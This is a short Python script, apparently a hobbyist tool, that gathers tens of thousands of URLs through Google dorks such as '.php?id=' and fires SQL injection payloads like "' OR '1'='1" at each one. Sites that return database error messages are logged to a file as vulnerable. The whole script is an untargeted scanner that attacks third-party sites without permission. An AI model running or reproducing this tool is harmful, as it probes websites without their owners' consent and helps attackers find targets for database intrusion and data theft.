from googlesearch import search
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

RED = "\033[91m"
RESET = "\033[0m"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

number_mawa9i3 = 50000

sql_id = [1, 2, 3, "' OR '1'='1", "' OR '1'='1' -- "]

sql_errors = [
    "You have an error in your SQL syntax",
    "Warning: mysql_fetch",
    "unclosed quotation mark after the character string",
    "Microsoft OLE DB Provider for SQL Server",
]

def check_url(url, sql_id):
    if "id=" in url:
        base = url.split("id=")[0]
        url_test = base + "id=" + str(sql_id)
    else:
        return None

    try:
        r = requests.get(url_test, timeout=5, verify=False)  
        content = r.text
        if any(err in content for err in sql_errors):
            return url_test  
        else:
            return None
    except requests.RequestException:
        return None

dorks = ['".php?id="', '".php?cat="', '".php?cat_id="']  
for dork in dorks:
    print(f"\n=== Serch sql ===by mohamed ilkhadry\n")
    urls = list(search(dork, num_results=number_mawa9i3, lang="en"))

    futures = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        for url in urls:
            for y in sql_id:
                futures.append(executor.submit(check_url, url, y))

        for i, future in enumerate(as_completed(futures), start=1):
            result = future.result()
            if result:
                print(f"{RED}[VULN] {result}{RESET}")
                with open("vulnerable.txt", "a") as f:
                    f.write(result + "\n")
            print(f"[{i}/{len(futures)}] Checked")
